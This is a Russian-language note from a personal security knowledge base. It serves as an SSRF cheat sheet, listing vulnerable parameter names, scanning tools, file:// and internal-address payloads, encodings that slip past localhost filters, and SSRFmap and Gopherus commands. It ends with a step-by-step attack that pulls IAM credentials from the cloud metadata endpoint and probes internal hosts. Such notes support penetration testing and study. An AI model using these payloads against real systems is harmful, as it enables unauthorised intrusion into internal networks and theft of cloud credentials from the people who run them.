---
title: "SSRF"
id: note-26
created: "07.01.2026 21:02"
category: "05_Веб-уязвимости"
tags:
  - иб/веб
  - web
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `05_Веб-уязвимости` · Дата: `07.01.2026 21:02`

# SSRF

 Обнаружение SSRF

 Пассивное обнаружение
 Анализ параметров URL:
  url=, path=, dir=, file=, document=, folder=, style=, script=
  
Параметры загрузки/импорта:
  load=, import=, include=, fetch=, request=, proxy=
  
API-эндпоинты:
  /api,/fetch, /proxy, /export, /download, /render

Вебхуки и callback:
  callback=, return=, redirect=, next=


Активное сканирование

Инструменты:
Burp Suite Scanner
OWASP ZAP
Nuclei (`nuclei -t ssrf.yaml`)
SSRFTester
SSRFmap


Эксплуатация SSRF
Базовые атаки

Чтение локальных файлов:
file:///etc/passwd
file:///c:/windows/system32/drivers/etc/hosts

Доступ к внутренним сервисам:
http://127.0.0.1:8080/admin
http://192.168.1.1:80
http://internal.company.local

 Обход фильтров
Методы обхода блокировки localhost:
IPv6
http://[::]:80
http://[::1]/

Альтернативные форматы
http://0.0.0.0
http://127.0.0.2
http://127.1
http://0177.0.0.1  (восьмеричная)
http://2130706433   (десятичная)
http://localhost.
http://localHOST    (регистр)


URL-кодирование:
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://127.0.0.1 → http://127.0.0.1%252f../

Инструменты для эксплуатации

1. SSRFmap (автоматизация)
python3 ssrfmap.py -r request.txt -p url
python3 ssrfmap.py -r request.txt -m portscan
python3 ssrfmap.py -r request.txt -m cloud

2. Gopherus (генератор gopher payload)
python gopherus.py --exploit mysql

3. Collaborator Everywhere (Burp)
Автоматически добавляет Collaborator payloads

4. Собственный скрипт мониторинга
simple-ssrf-listener.py
from flask import Flask, request
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)

@app.route('/')
def index():
    print(f"[+] Получен запрос от {request.remote_addr}")
    print(f"    User-Agent: {request.headers.get('User-Agent')}")
    print(f"    Метод: {request.method}")
    print(f"    Параметры: {request.args}")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)


Пример полной атаки

Сценарий:
1. Обнаруживаем параметр:
   GET /fetch?url=https://api.target.com/data

2. Проверяем SSRF:
   GET /fetch?url=http://burpcollaborator.net

3. Обходим фильтры:
   GET /fetch?url=http://127.0.0.1:80@burpcollaborator.net

4. Доступ к метаданным:
   GET /fetch?url=http://169.254.169.254/latest/meta-data/

5. Кража credentials:
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

6. Внутреннее сканирование:
   GET /fetch?url=http://192.168.1.1:8080/actuator/env
